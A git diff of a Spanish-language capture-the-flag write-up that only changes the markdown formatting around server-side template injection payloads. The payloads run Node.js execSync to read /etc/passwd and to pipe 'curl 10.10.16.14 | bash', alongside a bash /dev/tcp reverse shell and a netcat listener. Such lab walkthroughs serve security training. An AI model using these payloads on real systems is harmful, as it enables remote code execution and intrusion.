@@ -98,10 +98,8 @@ Añadimos el dominio a /etc/hosts, y vamos a buscar a ver que encontramos en la 
 
 Vemos que en esta página se pueden introducir datos y asi buscar alguna debilidad, vamos a introducir {{7*7}}@test.tets a ver si se podría hacer un SSTI. Vemos que nos devuelve 49@test.test y por tanto existe una debilidad SSTI.
 Ahora con el burpsuite (intermediario), vamos a jugar a ver si podemos hacer algo. 
-
-```
 "email":"{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('tail /etc/passwd')\")()}}@ola.ola"
-```
+
 Vemos que si que nos devuelve el /etc/passwd de la máquina víctima, por tanto podemos ejecutar comandos. 
 ## Intrusión
 Ahora podemos crear un index.html para poder hacer un curl:
@@ -113,9 +111,8 @@ bash -i >& /dev/tcp/10.10.16.5/443 0>&1
 ```
 Ahora lo compartimos con un servidoe en python3 (python3 -m http.server 80), y nos ponemos en escucha por el puerto 443 (nc -nvlp 443). Y ahora si mandamos un curl que interpretamos con bash.
 
-```
 "email":"{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('curl 10.10.16.14 | bash')\")()}}@ola.ola"
-```
+
 Ahora ya estaremos dentro de la máquina víctima. La flag de usuario ya podemos conseguirla. Para que la consola sea totalmente interactiva podemos hacer lo siguiente:
 ```
 script /dev/null -c bash
